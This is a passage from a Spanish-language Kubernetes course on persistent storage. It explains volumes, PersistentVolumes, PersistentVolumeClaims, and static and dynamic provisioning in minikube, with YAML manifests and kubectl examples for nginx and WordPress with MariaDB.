la aplicaci√≥n\nPara acceder a la aplicaci√≥n vamos a crear un recurso Ingress que tenemos definido en el fichero: wordpress-ingress.yaml. Como podemos observar vamos a usar el nombre www.miwordpress.org que tendremos que a√±adir en la resoluci√≥n est√°tica del ordenador desde el que vamos a acceder. Tambi√©n es interesante observar a que Service se va acceder con este recurso Ingress, el nombre del Service es wordpress-service que evidentemente es el mismo que hemos puesto en la definici√≥n del Service de Wordpress.\nUna vez que comprobemos que todos los recursos est√°n funcionando, podemos acceder a nuestra aplicaci√≥n:\n"},"Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.0-almacenamiento-en-kubernetes":{"title":"8.0-almacenamiento-en-kubernetes","links":[],"tags":[],"content":"8. Almacenamiento en Kubernetes\nYa lo hemos comentando en anteriores m√≥dulos, pero es importante tener en cuenta que los Pods son ef√≠meros, es decir, cuando un Pod se elimina se pierde toda la informaci√≥n que ten√≠a. Evidentemente, cuando creamos un nuevo Pod no contendr√° ninguna informaci√≥n adicional a la propia aplicaci√≥n.\nPodemos fijarnos en el Ejemplo: Despliegue y acceso a Wordpress + MariaDB (que vestudiamos en el m√≥dulo anterior), y responder las siguientes preguntas:\n\n\n¬øQu√© pasa si eliminamos el despliegue de mariadb?, o, ¬øse elimina el Pod de mariadb y se crea uno nuevo?\nEvidentemente, toda la informaci√≥n guardada en la base de datos se perder√°, por lo que al iniciar un nuevo despliegue, no tendremos informaci√≥n guardada, habremos perdido todo el contenido de nuestra aplicaci√≥n y empezar√≠a de nuevo el proceso de instalaci√≥n.\n\n\n¬øQu√© pasa si escalamos el despliegue de la base de datos y tenemos dos Pods ofreciendo la base de datos?\nEn este caso el Pod m√°s antiguo tendr√≠a la informaci√≥n de la base de datos, pero el nuevo Pod creado al escalar el despliegue no tendr√≠a ninguna informaci√≥n. Como al acceder al Service de la base de datos se hace balanceo de carga, en unas ocasiones acceder√≠amos al Pod antiguo, y todo funcionar√≠a correctamente, pero cuando acceder√≠amos al Pod nuevo, al no tener informaci√≥n, nos mostrar√≠a la pantalla de instalaci√≥n de la aplicaci√≥n. En definitiva, tendr√≠amos dos bases de datos distintas a las que acceder√≠amos indistintamente.\n\n\nSi escribimos un post en el Wordpress y subimos una imagen, ¬øqu√© pasa con esta informaci√≥n en el Pod?\nEst√° claro que cuando escribimos un post esa informaci√≥n se guarda en la base de datos. Pero la imagen que hemos subido al post se guardar√≠a en un directorio del servidor web (del Pod de Wordpress). Tendr√≠amos los mismos problemas que con la base de datos, si eliminamos este Pod se perder√° todo el contenido est√°tico de nuestro Wordpress.\n\n\n¬øQu√© pasa si escalamos el despliegue de Wordpress a dos Pods?\nPues la respuesta es similar a la anterior. En este caso, el Pod antiguo tendr√≠a almacenada el contenido est√°tico (la imagen), pero el nuevo no tendr√≠a esa informaci√≥n. Como al acceder a la aplicaci√≥n se balancea la carga, se mostrar√≠a la imagen diferente en funci√≥n del Pod que estuvi√©ramos accediendo.\n\n\nPor lo tanto, es necesario usar un mecanismo que nos permita guardar la informaci√≥n con la que trabajan los Pods para que no se pierda en caso de que el Pod se elimine. Al sistema de almacenamiento persistente que nos ofrece Kubernetes lo llamamos vol√∫menes. Con el uso de dichos vol√∫menes vamos a conseguir varias cosas:\n\nSi un Pod guarda su informaci√≥n en un volumen, est√° no se perder√°. Por lo que podemos eliminar el Pod sin ning√∫n problema y cuando volvamos a crearlo mantendr√° la misma informaci√≥n. En definitiva, los vol√∫menes proporcionan almacenamiento adicional o secundario al disco que define la imagen.\nSi usamos vol√∫menes, y tenemos varios Pods que est√°n ofreciendo un servicio, estos Pods tendr√°n la informaci√≥n compartida y por tanto todos podr√°n leer y escribir la misma informaci√≥n.\nTambi√©n podemos usar los vol√∫menes dentro de un Pod, para que los contenedores que forman parte de √©l puedan compartir informaci√≥n.\n\nPor √∫ltimo, indicar que vamos a tener a nuestra disposici√≥n distintos tipos de vol√∫menes para usar. Hay que tener en cuenta que si nuestro cluster tiene varios nodos y los Pods de una aplicaci√≥n se reparten por estos nodos, necesitamos sistemas de almacenamiento que nos posibiliten compartir la informaci√≥n entre los nodos del cluster. Como en este curso estamos usando minikube, nuestro cluster tiene un solo nodo, por lo que vamos a usar un tipo de almacenamiento que permita compartir la informaci√≥n dentro de este nodo (por ejemplo un directorio en el sistema de archivos del nodo), por lo tanto este tema lo vamos a simplificar al no tener la posibilidad de tener un cluster con varios nodos."},"Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.1-volumenes-en-kubernetes":{"title":"8.1-volumenes-en-kubernetes","links":[],"tags":[],"content":"8.1 Vol√∫menes en Kubernetes\nTipos de vol√∫menes\nLos vol√∫menes nos permiten proporcional almacenamiento a los Pods, y podemos usar distintos tipos que nos ofrecen distintas caracter√≠sticas:\n\nProporcionados por proveedores de cloud: AWS, Azure, GCE, OpenStack, etc\nPropios de Kubernetes:\n\nconfigMap: Para usar un configMap como un directorio desde el Pod.\nemptyDir: Volumen ef√≠mero con la misma vida que el Pod. Usado como almacenamiento secundario o para compartir entre contenedores del mismo Pod.\nhostPath: Monta un directorio del host en el Pod (usado excepcionalmente, pero es el que nosotros vamos a usar con minikube).\n‚Ä¶\n\n\nHabituales en despliegues ‚Äúon premises‚Äù: glusterfs, cephfs, iscsi, nfs, etc.\n\nTrabajando con vol√∫menes\nAl trabajar con vol√∫menes en Kubernetes se realizan dos funciones claramente diferenciadas:\n\n\nDesde el punto de vista del administrador del cluster de Kubernetes:\nEl administrador es el responsable de la gesti√≥n del almacenamiento en el cl√∫ster de k8s. Proporciona almacenamiento a las aplicaciones, entrando a detalle en configurar los diferentes mecanismo, bien proporcionados por el proveedor de cloud o configurados directamente. Para ello gestiona los recursos del cluster llamados PersistentVolume o StorageClasses. Ejemplos:\n\nConfigurar Azure Disk para que pueda usarlo k8s.\nConfigurar Cephfs o RBD en la red local para usarlo en k8s.\n\n\n\nDesde el punto de vista del desarrollador de aplicaciones que van a ser ejecutadas en el cluster de Kubernetes:\nA los desarrolladores de aplicaciones les interesa m√°s la disponibilidad y las caracter√≠sticas del almacenamiento que los detalles sobre el mecanismo de almacenamiento. Para solicitar almacenamiento se va a utilizar el recurso del cluster PersistentVolumeClaim. Ejemplos:\n\nQuiero 20 GiB de almacenamiento permanente que pueda compartir entre varios Pods de varios nodos en modo lectura.\nQuiero 10 GiB de almacenamiento provisional para usar desde un Pod en modo lectura y escritura.\n\n\n"},"Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.2-aprovisionamiento-de-volumenes":{"title":"8.2-aprovisionamiento-de-volumenes","links":[],"tags":[],"content":"8.2 Aprovisionamiento de vol√∫menes\nPara que el administrador de Kubernetes defina los vol√∫menes disponibles en nuestro cluster tenemos dos posibilidades:\n\nAprovisionamiento est√°tico\nEn este caso, es el administrador del cluster el responsable de ir definiendo los distintos vol√∫menes disponibles en el cluster creando manualmente los distintos recursos PersistentVolumen (PV).\nUn PersistentVolumen es un objeto que representa los vol√∫menes disponibles en el cluster. En √©l se van a definir los detalles del backend de almacenamiento que vamos a utilizar, el tama√±o disponible, los modos de acceso, las pol√≠ticas de reciclaje, etc.\nTenemos tres modos de acceso, que dependen del backend que vamos a utilizar:\n\nReadWriteOnce: read-write solo para un nodo (RWO)\nReadOnlyMany: read-only para muchos nodos (ROX)\nReadWriteMany: read-write para muchos nodos (RWX)\n\nLas pol√≠ticas de reciclaje de vol√∫menes tambi√©n dependen del backend y son:\n\nRetain: El PV no se elimina, aunque el PVC se elimine. El administrador debe borrar el contenido para la pr√≥xima asociaci√≥n.\nRecycle: Reutilizar contenido. Se elimina el contenido y el volumen es de nuevo utilizable.\nDelete: Se borra despu√©s de su utilizaci√≥n.\n\nA modo de resumen, ponemos en la siguiente tabla los modos de acceso de algunos de los sistemas de almacenamiento m√°s usados:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPluginReadWriteOnceReadOnlyManyReadWriteManyAWS EBS‚úì--AzureFile‚úì‚úì‚úìAzureDisk‚úì--CephFS‚úì‚úì‚úìCinder‚úì--GCEPersistentDisk‚úì‚úì-Glusterfs‚úì‚úì‚úìHostPath‚úì--iSCSI‚úì‚úì-NFS‚úì‚úì‚úìRBD‚úì‚úì-\nPor √∫ltimo, vemos un ejemplo de un fichero yaml que nos permite la definici√≥n de un PersitentVolumen:\napiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name: pv1\nspec:\n  storageClassName: manual\n  capacity:\n    storage: 5Gi\n  accessModes:\n    - ReadWriteOnce\n  persistentVolumeReclaimPolicy: Recycle\n  hostPath:\n    path: /data/pv1\n\n\nstorageClassName: manual: Indica que este volumen se puede asignar de forma est√°tica, sin utilizar ning√∫n ‚Äúaprovisonador‚Äù de almacenamiento.\nSe indica al tama√±o del volumen, con capacity, storage.\naccessModes: El modo de acceso.\npersistentVolumeReclaimPolicy: La pol√≠tica de reciclaje.\nY por √∫timo se indica el tipo (backend) de almacenamiento, en este caso es de tipo hostPath que crear√° un directorio (/data/pv1) en el nodo para guardar la informaci√≥n.\n\nAprovisionamiento din√°mico\nCuando el desarrollador necesita almacenamiento para su aplicaci√≥n, hace una petici√≥n de almacenamiento creando un recurso PersistentVolumenClaim (PVC) y de forma din√°mica se crea el recurso PersistentVolume que representa el volumen y se asocia con esa petici√≥n. De otra forma explicado, cada vez que se cree un PersistentVolumenClaim, se crear√° bajo demanda un PersistentVolumen que se ajuste a las caracter√≠sticas seleccionadas.\nPara conseguir la gesti√≥n din√°mica de vol√∫menes, necesitamos un ‚Äúaprovisionador‚Äù de almacenamiento (tendremos distintos aprovisionadores para los distintos tipos de almacenamiento).\nPara definir los ‚Äúaprovisionadores‚Äù de almacenamiento, usaremos el objeto StorageClass. En Minikube, por defecto, ya tenemos un provisionador para almacenamiento del tipo hostPath (monta un directorio del host en el pod).\nkubectl get storageclass\nNAME                 PROVISIONER                RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE\nstandard (default)   k8s.io/minikube-hostpath   Delete          Immediate           false                  46d\n\nEn este caso la configuraci√≥n del objeto storageclass se defini√≥ con las siguientes caracter√≠sticas:\n\nLa pol√≠tica de reciclaje tiene el valor Delete.\nY el modo de asociaci√≥n (VOLUMEBINDINGMODE) tiene el valor Immediate, es decir, cuando se cree el objeto PersistenVolumenClaim se asociar√° de forma din√°mica un volumen (objeto PersistenVolumen) inmediatamente. Otro valor podr√≠a ser WaitForFirstConsumer, en ese caso la asociaci√≥n se har√≠a cuando se utilizar√° el volumen.\n"},"Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.3-solicitud-de-volumenes":{"title":"8.3-solicitud-de-volumenes","links":[],"tags":[],"content":"8.3 Solicitud de vol√∫menes\nIndependientemente de c√≥mo haya aprovisionado el almacenamiento el administrador del cluster (de forma din√°mica o de forma est√°tica), el desarrollador debe hacer una solicitud de almacenamiento, indicando las caracter√≠sticas del volumen que necesita.\nUn desarrollador no necesita conocer los distintos tipos de vol√∫menes disponibles en el cluster. ¬°Son detalles muy espec√≠ficos!\nUn desarrollador se centra en indicar los requerimientos que debe tener el volumen que necesita:\n\nTama√±o.\nTipo de acceso (s√≥lo lectura o lectura / escritura).\nTipo de volumen (s√≥lo si es importante).\n\nPara hacer la solicitud de un volumen, el desarrollador debe crear un recurso en el cluster llamado PersitentVolumenClaim, veamos un ejemplo:\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n    name: pvc1\nspec:\n  storageClassName: manual\n  accessModes:\n    - ReadWriteOnce\n  resources:\n    requests:\n      storage: 1Gi\n\nEn esta solicitud el desarrollador indica los requisitos que necesita para su almacenamiento:\n\nstorageClassName: manual: Con esto indicamos que no se use ning√∫n aprovisionador din√°mico. Si no pongo esta l√≠nea se intentaran asociar un volumen de forma din√°mica.\naccessModes: El tipo de acceso que necesita.\nY el tama√±o que necesita en resources, requests, storage.\n\nUna vez que se crea este recurso, el cluster intentar√° asignar un volumen (ya sea de forma est√°tica o din√°mica) que cumpla con los requisitos indicados."},"Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.4-uso-de-volumenes":{"title":"8.4-uso-de-volumenes","links":[],"tags":[],"content":"8.4 Uso de vol√∫menes\nUna vez que hemos solicitado el almacenamiento, y se ha asignado un volumen (ya sea de forma din√°mica o est√°tica), vamos a definir el uso que se va a hacer de este volumen.\nComo ejemplo, vamos a definir un Pod que utilice dicho volumen, para ello vamos a crear un fichero yaml con la siguiente definici√≥n:\nkind: Pod\napiVersion: v1\nmetadata:\n  name: task-pv-pod\nspec:\n  volumes:\n    - name: task-pv-storage\n      persistentVolumeClaim:\n       claimName: pvc1\n  containers:\n    - name: task-pv-container\n      image: nginx\n      ports:\n        - containerPort: 80\n          name: &quot;http-server&quot;\n      volumeMounts:\n        - mountPath: &quot;/usr/share/nginx/html&quot;\n          name: task-pv-storage\n\n\nEn la especificaci√≥n de este Pod, adem√°s de indicar el contenedor, hemos indicado que va a tener un volumen (campo volumes).\nEn realidad definimos una lista de vol√∫menes (en este caso solo definimos uno) indicando su nombre (name) y la solicitud del volumen (persistentVolumeClaim, claimName).\nAdem√°s en la definici√≥n del contenedor tendremos que indicar el punto de montaje del volumen (volumeMounts) se√±alando el directorio del contenedor (mountPath) y el nombre (name).\n\nCuando el Pod termina, el pvc mantiene el volumen reservado (bound). Es necesario que se borre expl√≠citamente el pvc para liberarlo.\nLa recuperaci√≥n del volumen depender√° de la pol√≠tica de reciclaje que tuviera asignada."},"Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/ejemplo-1-gestion-estatica-de-volumenes":{"title":"ejemplo-1-gestion-estatica-de-volumenes","links":[],"tags":[],"content":"Ejemplo 1: Gesti√≥n est√°tica de vol√∫menes\nOcultar\nEn este ejemplo vamos a desplegar un servidor web que va a servir una p√°gina html que tendr√° almacenada en un volumen. En este primer ejemplo, la asignaci√≥n del volumen se va a realizar de forma est√°tica.\nAprovisonamiento del volumen\nEn este caso, ser√° el administrador del cluster el responsable de dar de alta en el cluster los vol√∫menes disponibles. Como hemos estudiado anteriormente, indicaremos algunas caracter√≠sticas del volumen: la capacidad, el modo de acceso, la pol√≠tica de reciclaje, el tipo de volumen,‚Ä¶\nPara ello vamos a describir el objeto PersistentVolume en el fichero pv-ejemplo1.yaml:\napiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name: pv-ejemplo1\nspec:\n  storageClassName: manual\n  capacity:\n    storage: 5Gi\n  accessModes:\n    - ReadWriteOnce\n  persistentVolumeReclaimPolicy: Recycle\n  hostPath:\n    path: /data/pv-ejemplo1\n\nNota\nOcultar\nNota: como estamos utilizando minikube, y nuestro cluster est√° formado por un s√≥lo nodo, el tipo de almacenamiento m√°s simple que podemos usar es hostPath, que crear√° un directorio en el nodo (/data/pv-ejemplo1) que ser√° el que se monte en el Pod para guardar la informaci√≥n.\nOcultar\nEl administrador crea el volumen:\nkubectl apply -f pv-ejemplo1.yaml\n\nPodemos ver los vol√∫menes que tenemos disponibles en el cluster:\nkubectl get pv\nNAME                           CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS      CLAIM   STORAGECLASS   REASON   AGE\npersistentvolume/pv-ejemplo1   5Gi        RWX            Recycle          Available           manual                  73s\n\nNos fijamos que el estado del volumen es Available, todav√≠a no se ha asociado con ninguna solicitud de volumen.\nY podemos obtener los detalle de este recurso:\nkubectl describe pv pv-ejemplo1\n\nSolicitud del volumen\nA continuaci√≥n, nosotros como desarrolladores necesitamos solicitar un volumen con ciertas caracter√≠sticas para nuestra aplicaci√≥n, para ello vamos a definir un objeto PersistentVolumeClaim, que definiremos en el fichero pvc-ejemplo1.yaml:\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n    name: pvc-ejemplo1\nspec:\n  storageClassName: manual\n  accessModes:\n    - ReadWriteOnce\n  resources:\n    requests:\n      storage: 1Gi\n\nComo vemos, desde el punto de vista del desarrollador no se necesita saber los tipos de vol√∫menes que tenemos disponibles, simplemente indicamos que queremos un 1Gb de almacenamiento, el tipo de acceso y que se haga la asignaci√≥n de forma est√°tica (storageClassName: manual).\nCuando creemos el objeto PersistentVolumeClaim podremos comprobar si hay alg√∫n volumen (PersistentVolume) disponible en el cluster que cumpla con los requisitos:\nkubectl apply -f pvc-ejemplo1.yaml\n\nkubectl get pv,pvc\nNAME                           CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                  STORAGECLASS   REASON   AGE\npersistentvolume/pv-ejemplo1   5Gi        RWX            Recycle          Bound    default/pvc-ejemplo1   manual                  2m1s\n\nNAME                                 STATUS   VOLUME        CAPACITY   ACCESS MODES   STORAGECLASS   AGE\npersistentvolumeclaim/pvc-ejemplo1   Bound    pv-ejemplo1   5Gi        RWX            manual         3s\n\nPodemos apreciar que el el estado del volumen ha cambiado a Bound que significa que ya est√° asociado al PersistentVolumeClaim que hemos creado.\nNota\nOcultar\nNota: El desarrollador quer√≠a 1 Gb de disco, demanda que se cumple de sobra con los 5 Gb del volumen que se ha asociado.\nOcultar\nUso del volumen\nUna vez que tenemos un volumen a nuestra disposici√≥n, vamos a crear un despliegue de un servidor web, indicando en la especificaci√≥n del Pod, que estar√° formado por el volumen y el directorio donde vamos a montarlo. Para ello vamos a usar el fichero deploy-ejemplo1.yaml:\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ejemplo1\n  labels:\n    app: nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      volumes:\n        - name: volumen-ejemplo1\n          persistentVolumeClaim:\n            claimName: pvc-ejemplo1\n      containers:\n        - name: contenedor-nginx\n          image: nginx\n          ports:\n            - name: http-server\n              containerPort: 80\n          volumeMounts:\n            - mountPath: &quot;/usr/share/nginx/html&quot;\n              name: volumen-ejemplo1\n\nPodemos observar que en la especificaci√≥n del Pod hemos indicado que estar√° formado por un volumen correspondiente al asignado al PersistentVolumeClaim pvc-ejemplo1 y que el contenedor tendr√° en el volumen un punto de montaje en el directorio DocumentRoot de nginx (/usr/share/nginx/html) .\nCreamos el Deployment:\nkubectl apply -f deploy-ejemplo1.yaml\n\nY a continuaci√≥n, cuando el contenedor est√© funcionando:\nkubectl get all\n...\nNAME                                  READY   STATUS    RESTARTS   AGE\npod/nginx-ejemplo1-86864d84b5-s62dq   1/1     Running   0          6s\n...\n\nVamos a ejecutar un comando en el Pod para que se cree un fichero index.html en el directorio /usr/share/nginx/html (evidentemente estaremos guardando ese fichero en el volumen).\nkubectl exec pod/nginx-ejemplo1-86864d84b5-s62dq -- bash -c &quot;echo &#039;&lt;h1&gt;Almacenamiento en K8S&lt;/h1&gt;&#039; &gt; /usr/share/nginx/html/index.html&quot;\n\nFinalmente creamos el Service de acceso al despliegue, usando el fichero srv-ejemplo1.yaml.\nkubectl apply -f srv-ejemplo1.yaml\n\nkubectl get all\n...\nservice/nginx-ejemplo1   NodePort    10.106.238.146   &lt;none&gt;        80:32581/TCP   13s\n...\n\nY accedemos a la aplicaci√≥n, accediendo a la ip del nodo controlador del cluster y al puerto asignado al Service NodePort:\nminikube ip\n192.168.39.222\n\nImagen de elaboraci√≥n propia (CC BY-NC-SA)\n\nComprobemos la persistencia de la informaci√≥n\nEn primer lugar podemos acceder al nodo del cluster y comprobar que en el directorio que indicamos en la creaci√≥n del volumen, efectivamente existe el fichero index.html:\nminikube ssh\nls /data/pv-ejemplo1\nindex.html\n\nEn segundo lugar podemos hacer la prueba de eliminar el despliegue, volver a crearlo y volver a acceder a la aplicaci√≥n para comprobar que el servidor web sigue sirviendo el mismo fichero index.html:\nkubectl delete -f deploy-ejemplo1.yaml\nkubectl apply -f deploy-ejemplo1.yaml\n\nY volvemos acceder al mismo puerto:\nImagen de elaboraci√≥n propia (CC BY-NC-SA)\n\nEliminaci√≥n del volumen\nSi finalmente queremos eliminar los vol√∫menes creados, tendremos que eliminar la solicitud, el objeto PersistentVolumeClaim, y dependiendo de la pol√≠tica de reciclaje con la que creamos el objeto PersistentVolume tendremos distintos comportamientos.\nEn este caso, como la pol√≠tica de reciclaje con la que creamos el volumen es Recycle, no se eliminar√° pero se borrar√° su contenido y el volumen se podr√° reutilizar, es decir su estado volver√° a Available:\nkubectl delete persistentvolumeclaim/pvc-ejemplo1\n\nkubectl get pv,pvc\nNAME                           CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS      CLAIM   STORAGECLASS   REASON   AGE\npersistentvolume/pv-ejemplo1   5Gi        RWX            Recycle          Available           manual                  8m8s\n\nSi queremos eliminar el objeto PersistentVolume, ejecutamos:\nkubectl delete persistentvolume/pv-ejemplo1\n"},"Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/ejemplo-2-gestion-dinamica-de-volumenes":{"title":"ejemplo-2-gestion-dinamica-de-volumenes","links":[],"tags":[],"content":"Ejemplo 2: Gesti√≥n din√°mica de vol√∫menes\nOcultar\nEn este ejemplo vamos a desplegar un servidor web que va a servir una p√°gina html que tendr√° almacenada en un volumen. En esta ocasi√≥n, la asignaci√≥n del volumen se va a realizar de forma din√°mica.\nAprovisonamiento del volumen\nPara que la asignaci√≥n del volumen (objeto PersitentVolume) se haga de forma din√°mica al crear la solicitud (objeto PersitentVolumeClaim) es necesario tener configurado un aprovisonador de almacenamiento que se define en un objeto StorageClass. Como vimos en minikube tenemos configurado un aprovisonador para vol√∫menes de tipo hostPath:\nkubectl get storageclass\nNAME                 PROVISIONER                RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE\nstandard (default)   k8s.io/minikube-hostpath   Delete          Immediate           false                  46d\n\nDe tal manera que cuando creemos una solicitud de volumen (objeto PersitentVolumeClaim) se creara de forma din√°mica un objeto PersitentVolume, que se asociar√≠a a la solicitud.\nSolicitud del volumen\nVamos a realizar la solicitud de volumen, en este caso usaremos el fichero pvc-ejemplo2.yaml:\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n    name: pvc-ejemplo2\nspec:\n  accessModes:\n    - ReadWriteOnce\n  resources:\n    requests:\n      storage: 1Gi\n\nNota\nOcultar\nNota: F√≠jate que esta definici√≥n hemos quitado la declaraci√≥n storageClassName: manual. Al no ponerla se elegir√° el storageclass por defecto, cuya definici√≥n hemos visto anteriormente en minikube y que en este caso se llama standard.\nOcultar\nCuando creemos el objeto PersistentVolumeClaim, veremos que de forma din√°mica se crear√° un PersitentVolumen que se asociar√° a nuestra solicitud::\nkubectl apply -f pvc-ejemplo2.yaml\n\nkubectl get pv,pvc\nNAME                                                        CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                  STORAGECLASS   REASON   AGE\npersistentvolume/pvc-6a09c69a-4344-447c-b23d-d85c7edd7f36   1Gi        RWX            Delete           Bound    default/pvc-ejemplo2   standard                1s\n\nNAME                                 STATUS   VOLUME                                     CAPACITY   ACCESS MODES   STORAGECLASS   AGE\npersistentvolumeclaim/pvc-ejemplo2   Bound    pvc-6a09c69a-4344-447c-b23d-d85c7edd7f36   1Gi        RWX            standard       1s\n\n\nNota\nOcultar\nNota: En este caso, como el volumen se ha generado din√°micamente, su capacidad es igual a la solicitada, 1 Gb.\nOcultar\nComo el volumen ha sido generado de forma din√°mica por el aprovisonador, √©ste habr√° escogido una carpeta del host que corresponda al volumen.\nkubectl describe persistentvolume/pvc-6a09c69a-4344-447c-b23d-d85c7edd7f36\n...\nSource:\n    Type:          HostPath (bare host directory volume)\n    Path:          /tmp/hostpath-provisioner/default/pvc-ejemplo2\n...\n\nUso del volumen\nA partir de este punto el ejercicio es muy parecido al que vimos en el ejemplo1.\nCreamos el Deployment usando el fichero deploy-ejemplo2.yaml:\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ejemplo2\n  labels:\n    app: nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      volumes:\n        - name: volumen-ejemplo2\n          persistentVolumeClaim:\n            claimName: pvc-ejemplo2\n      containers:\n        - name: contenedor-nginx\n          image: nginx\n          ports:\n            - name: http-server\n              containerPort: 80\n          volumeMounts:\n            - mountPath: &quot;/usr/share/nginx/html&quot;\n              name: volumen-ejemplo2\n\nCreamos el Deployment:\nkubectl apply -f deploy-ejemplo2.yaml\n\nY a continuaci√≥n, cuando el contenedor est√© funcionando, creamos el fichero index.html:\nkubectl get all\n...\nNAME                                 READY   STATUS    RESTARTS   AGE\npod/nginx-ejemplo2-7b79b5966-zbdqh   1/1     Running   0          5s\n...\nkubectl exec pod/nginx-ejemplo2-7b79b5966-zbdqh -- bash -c &quot;echo &#039;&lt;h1&gt;Almacenamiento en K8S&lt;/h1&gt;&#039; &gt; /usr/share/nginx/html/index.html&quot;\n\nFinalmente creamos el Service de acceso al despliegue, usando el fichero srv-ejemplo2.yaml.\nkubectl apply -f srv-ejemplo2.yaml\n\nkubectl get all\n...\nservice/nginx-ejemplo2   NodePort    10.99.48.24   &lt;none&gt;        80:31053/TCP   3s\n...\n\nY accedemos a la aplicaci√≥n accediendo a la ip del nodo controlador del cluster y al puerto asignado al Service NodePort:\nminikube ip\n192.168.39.222\n\nImagen de elaboraci√≥n propia (CC BY-NC-SA)\nFinalmente puedes volver a comprobar que la informaci√≥n de la aplicaci√≥n no se pierde borrando el Deployment y volvi√©ndolo a crear, comprobando que se sigue sirviendo el fichero index.html.\nEliminaci√≥n del volumen\nEn este caso, los vol√∫menes que crea de forma din√°mica el storageclass que tenemos creado en minikube, tienen como pol√≠tica de reciclaje el valor de Delete. Esto significa que cuando eliminemos la solicitud, el objeto PersistentVolumeClaim, tambi√©n se borrar√° el volumen, el objeto PersistentVolume.\nkubectl delete persistentvolumeclaim/pvc-ejemplo2\n\nkubectl get pv,pvc\nNo resources found\n"},"Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/ejemplo-3-wordpress-con-almacenamiento-persistente":{"title":"ejemplo-3-wordpress-con-almacenamiento-persistente","links":[],"tags":[],"content":"Ejemplo 3: Wordpress con almacenamiento persistente\nOcultar\nEn este ejemplo vamos a volver e realizar el Ejemplo completo: Despliegue y acceso a Wordpress + MariaDB del m√≥dulo anterior, pero a√±adiendo el almacenamiento necesario para que la aplicaci√≥n sea persistente.\nPara llevar a cabo esta tarea necesitaremos tener a nuestra disposici√≥n dos vol√∫menes:\n\nUno para guardar la informaci√≥n de Wordpress.\nOtro para guardar la informaci√≥n de MariaDB.\n\nPara este ejercicio utilizaremos asignaci√≥n din√°mica de vol√∫menes.\nCreaci√≥n de los vol√∫menes necesarios\nComo hemos comentado vamos a usar la asignaci√≥n din√°mica de vol√∫menes, por lo tanto tendremos que crear dos objetos PersistentVolumenClaim para solicitar los dos vol√∫menes.\nPara solicitar el volumen para la aplicaci√≥n Wordpress usaremos el fichero wordpress-pvc.yaml:\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n    name: wordpress-pvc\nspec:\n  accessModes:\n    - ReadWriteOnce\n  resources:\n    requests:\n      storage: 5Gi\n\nY para solicitar el volumen para la base de datos usaremos un fichero similar: mariadb-pvc.yaml:\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n    name: mariadb-pvc\nspec:\n  accessModes:\n    - ReadWriteOnce\n  resources:\n    requests:\n      storage: 5Gi\n\nCreamos las solicitudes y comprobamos que se ha asociado un volumen a cada una de ellas:\nkubectl apply -f wordpress-pvc.yaml\nkubectl apply -f mariadb-pvc.yaml\n\nkubectl get pv,pvc\nNAME                                                        CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                   STORAGECLASS   REASON   AGE\npersistentvolume/pvc-01ed3c4c-a542-4161-93a9-b9d5ea2bf6d1   5Gi        RWX            Delete           Bound    default/wordpress-pvc   standard                10s\npersistentvolume/pvc-78acc14b-71da-4cf0-861d-0ab7780bca4f   5Gi        RWX            Delete           Bound    default/mariadb-pvc     standard                10s\n\nNAME                                  STATUS   VOLUME                                     CAPACITY   ACCESS MODES   STORAGECLASS   AGE\npersistentvolumeclaim/mariadb-pvc     Bound    pvc-78acc14b-71da-4cf0-861d-0ab7780bca4f   5Gi        RWX            standard       10s\npersistentvolumeclaim/wordpress-pvc   Bound    pvc-01ed3c4c-a542-4161-93a9-b9d5ea2bf6d1   5Gi        RWX            standard       10s\n\n\nModificaci√≥n de los Deployments para el uso de los vol√∫menes\nA continuaci√≥n vamos a modificar el fichero wordpress-deployment.yaml para a√±adir el volumen al Pod y el punto de montaje:\n...\n    spec:\n      containers:\n      ...\n          volumeMounts:\n            - name: wordpress-vol\n              mountPath: /var/www/html\n      volumes:\n        - name: wordpress-vol\n          persistentVolumeClaim:\n            claimName: wordpress-pvc\n\nComo observamos vamos a usar el volumen asociado al PersistentVolumenClaim wordpress-pvc y que lo vamos a montar en el directorio DocumentRoot del servidor web: /var/www/html.\nDe forma similar, modificamos el fichero mariadb-deployment.yaml:\n...\n    spec:\n      containers:\n    ...\n          volumeMounts:\n            - name: mariadb-vol\n              mountPath: /var/lib/mysql\n      volumes:\n        - name: mariadb-vol\n          persistentVolumeClaim:\n            claimName: mariadb-pvc\n\nEn esta ocasi√≥n usaremos el volumen asociado a mariadb-pvc y el punto de montaje se har√° sobre el directorio donde se guarda la informaci√≥n de la base de datos: 